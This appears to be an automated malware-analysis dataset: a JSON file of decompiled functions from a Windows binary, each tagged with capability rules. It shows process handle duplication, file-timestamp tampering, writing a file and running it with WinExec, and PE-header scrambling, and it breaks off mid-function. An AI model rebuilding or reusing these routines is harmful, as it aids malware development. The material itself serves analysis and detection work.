{
    "00401000": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040113c) overlaps instruction at (ram,0x00401139)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(uint arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    char *pcVar9;\n    char *pcVar10;\n    char *pcVar11;\n    bool bVar12;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    uint *var_4h;\n    \n    // [00] -r-x section size 20480 named .text\n    puVar3 = &stack0xfffffffc;\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar7 = &var_22fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_12ch = '\\0';\n    puVar7 = &var_12bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar5 = 0xffffffff;\n    pcVar10 = &lpBuffer;\n    do {\n        pcVar9 = pcVar10;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar9 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar9;\n    } while (cVar1 != '\\0');\n    uVar5 = ~uVar5;\n    puVar7 = pcVar9 + -uVar5;\n    puVar8 = &var_12ch;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar5 = 0xffffffff;\n    pcVar10 = 0x407048;\n    do {\n        pcVar9 = pcVar10;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar9 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar9;\n    } while (cVar1 != '\\0');\n    uVar5 = ~uVar5;\n    iVar4 = -1;\n    pcVar10 = &var_12ch;\n    do {\n        pcVar11 = pcVar10;\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        pcVar11 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar11;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar9 + -uVar5;\n    puVar8 = pcVar11 + -1;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar5 = uVar5 & 3;\n    bVar12 = (POPCOUNT(uVar5) & 1U) != 0;\n    for (; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    if ((bVar12) && (!bVar12)) {\n        puVar7 = &stack0xfffffdb4;\n        cVar1 = '\\x1e';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar3;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    puVar3 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0);\n    puVar8 = var_4h;\n    puVar7 = arg_ch;\n    if ((arg_ch == 0xffffffff) &&\n       (puVar3 = fcn.00401bb0(arg_8h),  puVar8 = puVar3,  puVar7 = puVar3,  puVar3 == 0xffffffff)) {\n        return 0;\n    }\n    if ((puVar7 != 0xffffffff) || (puVar7 == 0xffffffff)) {\n        puVar3 = &var_14h;\n    }\n    uVar5 = *(arg_ch + 0xe58be73);\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(puVar8, &lpCreationTime, &var_1ch, puVar3);\n    if ((arg_ch ^ uVar5) == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar8);\n    }\n    return 1;\n}\n",
        "token_count": 1454
    },
    "00402960": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029f7) overlaps instruction at (ram,0x004029f6)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040298b)\n\nint32_t __cdecl fcn.00402960(uint arg_8h, uint32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint16_t uVar1;\n    uint in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *unaff_EBX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint unaff_EDI;\n    bool bVar6;\n    bool in_OF;\n    \n    uVar2 = arg_ch;\n    if ((!in_OF) && (in_OF)) {\n        uVar2 = CONCAT31(in_EAX >> 8, 0x98) | 0x8b;\n        arg_8h = unaff_EDI;\n    }\n    uVar1 = fcn.004028e0(0, arg_8h, uVar2 + 1 >> 1);\n    // WARNING: Bad instruction - Truncating control flow here\n    uVar5 = uVar1;\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    uVar2 = *(iVar3 + 0x58);\n    bVar6 = (POPCOUNT(uVar1 - uVar2 & 0xff) & 1U) == 0;\n    if (uVar1 < uVar2) {\n        if ((bVar6) || (!bVar6)) {\n            uVar5 = uVar5 - uVar2;\n        }\n        *unaff_EBX = *unaff_EBX + 0x10;\n        iVar4 = (uVar5 & 0xffff) - 1;\n    }\n    else {\n        iVar4 = uVar5 - (uVar2 & 0xffff);\n    }\n    if (iVar4 < uVar2 >> 0x10) {\n        iVar4 = (iVar4 - (uVar2 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar4 = iVar4 - (uVar2 >> 0x10);\n    }\n    *arg_14h = iVar4 + arg_ch;\n    *arg_10h = *(iVar3 + 0x58);\n    return iVar3;\n}\n",
        "token_count": 550
    },
    "00403210": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00403210(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407104);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x42252c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407114);\n    *0x422530 = (*pcVar1)(iVar2, 0x407130);\n    *0x422534 = (*pcVar1)(iVar2, 0x407140);\n    if (((*0x42252c != 0) && (*0x422530 != 0)) && (*0x422534 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "00403550": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403589) overlaps instruction at (ram,0x00403586)\n// \n\nuint __cdecl fcn.00403550(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char cVar5;\n    int32_t extraout_ECX;\n    bool bVar6;\n    ulong uVar7;\n    \n    uVar7 = fcn.00401220(0x40707c);\n    bVar6 = uVar7 == -1;\n    if (bVar6) {\n        return 0;\n    }\n    if (!bVar6) {\n        cVar5 = (extraout_ECX << 0x10) >> 0x18;\n        if (bVar6) goto code_r0x00403582;\n    }\n    cVar5 = extraout_ECX >> 8;\ncode_r0x00403582:\n    pcVar1 = (uVar7 >> 0x20) + 0x40;\n    *pcVar1 = *pcVar1 + cVar5;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x47);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar2, 0, 0, 0, 2);\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 381
    },
    "00401530": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401530(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42253c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403ea0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401830(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "00403070": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403185) overlaps instruction at (ram,0x00403184)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004030ce)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403070(int16_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    if ((!SBORROW2(*arg_8h, 0x5a4d)) && (SBORROW2(*arg_8h, 0x5a4d))) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    bVar9 = CARRY4(*(arg_8h + 0x1e), arg_8h);\n    piVar2 = *(arg_8h + 0x1e) + arg_8h;\n    if ((!bVar9 && piVar2 != NULL) && (bVar9 || piVar2 == NULL)) {\n        piVar2 = piVar2 & 0xe2f4cc58;\n    }\n    if (*piVar2 != 0x4550) {\n        return 0;\n    }\n    if (piVar2[0x16] != 0) {\n        return 0;\n    }\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    uVar1 = *(arg_8h + 0x1e) - 0x80;\n    if (0xbf < *(arg_8h + 0x1e)) {\n        uVar1 = 0x40;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x5727e95e;\n    puVar3 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    bVar9 = puVar3 == NULL;\n    if (bVar9) {\n        return 0;\n    }\n    if ((!bVar9) && (bVar9)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar6 = 0;\n    uVar5 = uVar1;\n    if (uVar1 != 0) {\n        do {\n            bVar9 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n            if ((bVar9) && (!bVar9)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar7 = uVar6 + 1;\n            uVar5 = uVar7 - uVar1;\n            *(uVar6 + puVar3) = iVar4 % 0xff;\n            uVar6 = uVar7;\n        } while (uVar7 < uVar1);\n    }\n    puVar8 = arg_8h + 0x40;\n    for (uVar5 = uVar1 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar5 = uVar1 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = *puVar3;\n    *(uVar1 - 4) = 0x403200;\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n    return 1;\n}\n",
        "token_count": 992
    },
    "00401220": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401276) overlaps instruction at (ram,0x00401274)\n// \n// WARNING: Removing unreachable block (ram,0x00401268)\n// WARNING: Removing unreachable block (ram,0x0040126f)\n\nuint __cdecl fcn.00401220(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x42252c)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar4 = &var_128h;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar3 = (**0x422530)(iVar1, &var_12ch);\n    do {\n        if (iVar3 == 0) {\ncode_r0x004012e9:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        uVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(0xf4, arg_8h);\n        bVar5 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n        if (uVar2 == 0) {\n            if ((bVar5) && (!bVar5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_4h = var_124h;\n            goto code_r0x004012e9;\n        }\n        iVar3 = (**0x422534)(iVar1, 0xd0);\n    } while( true );\n}\n",
        "token_count": 500
    },
    "00401af0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00401af0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401bb0(0x407010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00403460": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403488) overlaps instruction at (ram,0x00403486)\n// \n\nbool fcn.00403460(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((&var_10ch < 0) || (&var_10ch >= 0)) {\n        in_EAX = &var_4h;\n    }\n    iVar1 = fcn.004019a0(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, \n                         in_EAX + (&stack0xfffffffc < 0x10c) + 0xfc458d2f);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 243
    },
    "00403500": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040353d) overlaps instruction at (ram,0x0040353a)\n// \n\nuint __cdecl fcn.00403500(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0x98;\n}\n",
        "token_count": 104
    },
    "00403600": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004036ef) overlaps instruction at (ram,0x004036eb)\n// \n// WARNING: Removing unreachable block (ram,0x0040367e)\n\nuint fcn.00403600(uint param_1, uint param_2, uint param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t arg_8h;\n    uint32_t unaff_EDI;\n    bool bVar5;\n    uint8_t in_AF;\n    unkbyte10 extraout_ST0;\n    ulong uVar6;\n    int32_t iStack63;\n    uint uStack59;\n    uint uStack55;\n    uchar *puStack51;\n    uchar auStack8 [4];\n    \n    *0x422538 = fcn.00403460();\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iVar2 == -1) {\n        return 0;\n    }\n    arg_8h = iVar2;\n    if ((-2 < iVar2) && (iVar2 < -1)) {\n        arg_8h = iVar2 + -1;\n        *(unaff_EDI | &stack0xfffffffc) = iVar2;\n    }\n    uStack55 = param_3;\n    uStack59 = param_2;\n    puStack51 = auStack8;\n    iStack63 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (*0x422538 != 0) {\n        iVar2 = fcn.00403550(arg_8h);\n        *0x422538 = iVar2 == 0;\n    }\n    uVar6 = fcn.00401000(0, arg_8h);\n    piVar4 = uVar6 >> 0x20;\n    bVar5 = 0xfffffff7 < &stack0xffffffb9;\n    if ((SCARRY4(&stack0xffffffb9, 8) != &iStack63 < 0) ||\n       (uVar3 = uVar6,  SCARRY4(&stack0xffffffb9, 8) == &iStack63 < 0)) {\n        bVar5 = false;\n        uVar3 = *0x422538;\n    }\n    *(uVar3 + 0x8316dbec) = extraout_ST0;\n    uVar1 = uVar3 - 1;\n    in_AF = 9 < (uVar1 & 0xf) | in_AF;\n    uVar1 = uVar1 + in_AF * '\\x06';\n    *piVar4 = *piVar4 + 0x38a1df84;\n    if (((uVar3 - 1 & 0xffffff00 | uVar1 + (0x90 < (uVar1 & 0xf0) | bVar5 | in_AF * (0xf9 < uVar1)) * '`') & 0xc0850042)\n        == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 1;\n}\n",
        "token_count": 705
    },
    "00403f50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040401f) overlaps instruction at (ram,0x00404016)\n// \n// WARNING: Removing unreachable block (ram,0x004040b6)\n// WARNING: Removing unreachable block (ram,0x00404067)\n// WARNING: Removing unreachable block (ram,0x00404070)\n// WARNING: Removing unreachable block (ram,0x00404074)\n// WARNING: Variable defined which should be unmapped: var_10bh\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint8_t * __cdecl\nfcn.00403f50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar6;\n    uint32_t unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar7;\n    uint16_t in_SS;\n    bool bVar8;\n    uchar var_10ch;\n    uint var_10bh;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403c70(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20, unaff_EDI, unaff_ESI, unaff_EBX, _var_10ch, \n                 stack0xfffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04);\n    fcn.00403c70(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60, unaff_EDI, unaff_ESI, unaff_EBX, _var_10ch, \n                 stack0xfffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04);\n    fcn.00403c70(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0, unaff_EDI, unaff_ESI, unaff_EBX, _var_10ch, \n                 stack0xfffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04);\n    fcn.00403c70(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0, unaff_EDI, unaff_ESI, unaff_EBX, _var_10ch, \n                 stack0xfffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04);\n    if ((&stack0xfffffed0 < 0xffffffec) && (&stack0xfffffed0 >= 0xffffffec)) {\n        *(arg_20h + 0x43d1773a) = *(arg_20h + 0x43d1773a) ^ 0xe827e95e;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar4 = fcn.00403f00();\n    if (iVar4 == -1) {\n        iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar4 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar4;\n    }\n    puVar7 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    var_4h = 0x104;\n    *(puVar7 + 2) = 0;\n    puVar5 = fcn.004019a0(0x80000001, 0x407258, 0x407284, &var_8h, &var_10ch, &var_4h);\n    puVar6 = extraout_ECX;\n    if (puVar5 != NULL) {\n        puVar5 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        bVar8 = puVar5 == NULL;\n        puVar6 = extraout_ECX_00;\n        if ((bVar8) &&\n           ((bVar8 || (puVar6 = (extraout_ECX_00 >> 8 & 0xffff00) << 8 | extraout_ECX_00 & 0xffff,  !bVar8)))) {\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        }\n    }\n    uVar3 = puVar5;\n    *puVar6 = *puVar6 & uVar3;\n    uVar2 = *puVar5;\n    *puVar5 = *puVar5 + uVar3;\n    pcVar1 = (unaff_EBX & 0xffff0000 | in_SS) + 0x5e;\n    *pcVar1 = (*pcVar1 + -0x5b) - CARRY1(uVar2, uVar3);\n    return puVar5;\n}\n",
        "token_count": 1311
    },
    "004013a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004014b5) overlaps instruction at (ram,0x004014b4)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t * __fastcall\nfcn.004013a0(uint32_t *param_1, char *param_2, uint param_3, int32_t param_4, uint *param_5, uchar *param_6, \n            uint param_7, uint *param_8)\n\n{\n    uint8_t *puVar1;\n    char **ppcVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    code cVar5;\n    uint32_t *puVar6;\n    char *in_EAX;\n    code *pcVar7;\n    int32_t iVar8;\n    int32_t extraout_ECX;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uint32_t *puVar11;\n    uint *unaff_ESI;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uchar *unaff_EDI;\n    uint *puVar14;\n    int32_t *piVar15;\n    ushort in_SS;\n    uint8_t uVar16;\n    bool bVar17;\n    uint8_t in_AF;\n    char cVar18;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong 